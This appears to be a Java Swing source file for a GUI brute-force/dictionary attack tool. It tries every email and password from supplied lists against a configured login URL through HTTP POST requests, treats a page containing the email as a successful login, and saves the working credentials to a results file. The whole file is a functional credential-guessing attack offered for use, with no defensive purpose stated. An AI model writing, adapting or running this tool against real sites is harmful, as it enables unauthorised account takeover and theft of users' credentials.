package GUI;

import IO.ReadWriteFile;
import Models.User;
import Ultils.Values;
import org.jsoup.Connection;
import org.jsoup.Jsoup;

import javax.swing.*;
import java.awt.*;
import java.text.DecimalFormat;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class AttackGUI extends JFrame {

    private List<String> emails;
    private List<String> passwords;
    private int i = 0, j = 0;
    private boolean isRunning = false;
    private DecimalFormat dcf = new DecimalFormat("###.###");
    private int index = 0;

    public AttackGUI(List<String> emails,
                     List<String> passwords,
                     int index) {
        this.setTitle("Brute force/Dictionary attacking");
        this.setSize(500, 500);
        this.setResizable(false);

        this.emails = emails;
        this.passwords = passwords;
        this.index = index;

        addControls();
        addEvents();
    }

    private JTextArea txtLogs;
    private JProgressBar progressEmail, progressPassword;

    private void addControls() {
        Container con = getContentPane();

        JPanel pnMain = new MyPanel();
        pnMain.setLayout(new BoxLayout(pnMain, BoxLayout.Y_AXIS));

        JPanel pnTitle = new MyPanel();
        JLabel lblTitle = new JLabel("<html>" +
                "<div style='text-align:center;font-size:24px;color:blue;padding:10px 0;'>Brute force/dictionary attack</div>" +
                "<div style='text-align:center;text-decoration: underline;'>" + Values.LOGIN_URL + "</div>" +
                "</html>");
        pnTitle.add(lblTitle);
        pnMain.add(pnTitle);

        JPanel pnProgress = new MyPanel();
        pnProgress.setLayout(new BoxLayout(pnProgress, BoxLayout.Y_AXIS));
        JLabel lblEmailProgress = new JLabel("<html><div style='padding: 5px'>Email progress</div></html>");
        pnProgress.add(lblEmailProgress);
        progressEmail = new JProgressBar();
        progressEmail.setPreferredSize(new Dimension(400, 25));
        progressEmail.setStringPainted(true);
        pnProgress.add(progressEmail);

        JLabel lblPasswordProgress = new JLabel("<html><div style='padding: 5px'>Password progress</div></html>");
        pnProgress.add(lblPasswordProgress);
        progressPassword = new JProgressBar();
        progressPassword.setPreferredSize(new Dimension(400, 25));
        progressPassword.setStringPainted(true);
        pnProgress.add(progressPassword);
        pnMain.add(pnProgress);

        JPanel pnLog = new MyPanel();
        txtLogs = new JTextArea();
        txtLogs.setLineWrap(true);
        txtLogs.setBackground(Color.BLACK);
        txtLogs.setForeground(Color.WHITE);
        txtLogs.setEditable(false);
        JScrollPane scp = new JScrollPane(txtLogs, JScrollPane.VERTICAL_SCROLLBAR_NEVER, JScrollPane.HORIZONTAL_SCROLLBAR_NEVER);
        scp.setPreferredSize(new Dimension(490, 222));
        pnLog.add(scp);
        pnMain.add(pnLog);

        con.add(pnMain);
    }

    private Timer timer;

    private void addEvents() {
        writeLog("Begin attacking...");
        timer = new java.util.Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                if (!isRunning) {
                    processAttack();
                }
            }
        }, 0, 1);
    }

    private void processAttack() {
        isRunning = true;
        if (i >= emails.size() && j >= passwords.size()) {
            writeLog("Finish attack...");
            timer.cancel();
            return;
        }
        if (j >= passwords.size()) {
            j = 0;
            i++;
        }

        if (i < emails.size() && j < passwords.size()) {
            double emailPercent = i * 1.0 / (emails.size() - 1) * 100;
            double passwordPercent = j * 1.0 / (passwords.size() - 1) * 100;

            progressEmail.setValue((int) emailPercent);
            progressEmail.setString(dcf.format(emailPercent) + "%");

            progressPassword.setValue((int) passwordPercent);
            progressPassword.setString(dcf.format(passwordPercent) + "%");

            String email = emails.get(i);
            String password = passwords.get(j);
            writeLog(email + ":" + password + " [" + (j + 1) + "]");

            attackUsingEmailAndPassword(email, password);

            j++;
        }

        isRunning = false;
    }

    private void attackUsingEmailAndPassword(String email, String password) {
        try {
            // process to login
            Connection.Response loginResponse = Jsoup.connect(Values.LOGIN_URL)
                    .data(Values.EMAIL_FIELD, email)
                    .data(Values.PASSWORD_FIELD, password)
                    .data(Values.LOGIN_FIELD, "login")
                    .method(Connection.Method.POST)
                    .execute();
            if (loginResponse.parse().outerHtml().contains(email)) {
                User user = new User(email, password);
                ReadWriteFile.writeResult(user);
                i++;
                j = 0;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void writeLog(String log) {
        txtLogs.append(log + "\n");
        txtLogs.setCaretPosition(txtLogs.getDocument().getLength());
    }

    public void showWindow() {
        int x;
        int y;
        if (index <= 2) {
            y = 0;
            x = index * 500;
        } else {
            y = 500;
            x = index / 2 * 500;
        }
        System.out.println(index + " || " + x + ":" + y);
        this.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
        this.setLocation(x, y);
        this.setVisible(true);
    }

}

